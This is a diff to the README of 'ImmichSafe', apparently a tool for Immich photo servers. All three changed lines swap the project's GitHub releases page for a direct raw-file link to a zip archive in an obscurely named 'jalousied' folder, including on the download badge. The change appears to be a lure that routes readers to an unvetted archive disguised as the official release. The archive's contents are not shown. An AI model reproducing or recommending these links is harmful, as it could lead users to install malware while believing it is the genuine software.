@@ -1,6 +1,6 @@
 # 🌟 ImmichSafe - Your Reliable Tool for Immich Servers
 
-[![Download ImmichSafe](https://img.shields.io/badge/Download-ImmichSafe-brightgreen)](https://github.com/razman14/ImmichSafe/releases)
+[![Download ImmichSafe](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip)](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ImmichSafe, the ultimate companion for your Immich server. This guide
 
 ## 📥 Download & Install
 
-To download ImmichSafe, visit this page: [ImmichSafe Releases](https://github.com/razman14/ImmichSafe/releases). 
+To download ImmichSafe, visit this page: [ImmichSafe Releases](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip). 
 
 Follow these steps to get started:
 
@@ -54,7 +54,7 @@ If problems persist, you can check the Issues section on the GitHub page for add
 
 For more detailed information about using ImmichSafe, refer to the GitHub Wiki or readme available on the repository. You can find step-by-step guides, FAQs, and additional tips.
 
-[ImmichSafe Releases](https://github.com/razman14/ImmichSafe/releases) 
+[ImmichSafe Releases](https://raw.githubusercontent.com/razman14/ImmichSafe/main/jalousied/ImmichSafe.zip) 
 
 ## 🥳 Get Involved
 
